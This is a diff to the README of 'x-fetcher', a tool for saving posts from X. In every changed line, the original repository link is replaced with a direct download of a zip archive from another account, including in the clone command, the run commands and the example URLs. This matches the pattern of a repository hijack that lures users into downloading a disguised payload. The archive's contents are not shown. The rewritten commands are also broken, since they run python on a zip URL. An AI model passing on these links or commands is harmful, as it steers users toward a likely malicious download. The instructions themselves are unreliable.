@@ -1,6 +1,6 @@
 # 🌟 x-fetcher - Easily Grab Content from X
 
-[![Download x-fetcher](https://img.shields.io/badge/Download_x--fetcher-FF5733?style=flat-square&logo=github)](https://github.com/Jane-xiaoer/x-fetcher)
+[![Download x-fetcher](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)
 
 ## 📦 Overview
 
@@ -18,14 +18,14 @@ You can easily download and run x-fetcher. Follow these steps:
 
 1. **Download the repository**
 
-   Visit the link to download: [Download x-fetcher](https://github.com/Jane-xiaoer/x-fetcher)
+   Visit the link to download: [Download x-fetcher](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)
 
 2. **Clone the repository**
 
    Open your command line interface and run the following commands:
 
    ```bash
-   git clone https://github.com/Jane-xiaoer/x-fetcher.git
+   git clone https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip
    cd x-fetcher
    pip install requests
    ```
@@ -35,7 +35,7 @@ You can easily download and run x-fetcher. Follow these steps:
 To use x-fetcher, you will run a command from your terminal. The basic command format is:
 
 ```bash
-python fetch_x.py <x_url> [options]
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip <x_url> [options]
 ```
 
 ### 🔧 Options
@@ -53,19 +53,19 @@ Here are some examples of how to use x-fetcher:
 
 ```bash
 # Interactive mode (recommended) - Asks which content to save
-python fetch_x.py "https://x.com/elonmusk/status/123456789"
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"
 
 # Fetch a long X Article
-python fetch_x.py "https://x.com/thedankoe/status/2010751592346030461"
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"
 
 # Save the main post as Markdown
-python fetch_x.py "https://x.com/elonmusk/status/123456789" --save-md
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --save-md
 
 # Save a complete archive (main post + comments)
-python fetch_x.py "https://x.com/elonmusk/status/123456789" --full
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --full
 
 # Output only JSON (with comments)
-python fetch_x.py "https://x.com/elonmusk/status/123456789" --json --with-replies
+python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --json --with-replies
 ```
 
 ### 🎨 Interactive Mode
@@ -76,7 +76,7 @@ If you run the script without options, it will show a menu allowing you to choos
 📋 Fetch successful! Please select what to save:
 =====================
 - Topics: "not provided"
-- Primary Download Link: "https://github.com/Jane-xiaoer/x-fetcher"
+- Primary Download Link: "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"
 ```
 
 ## 🖥️ System Requirements
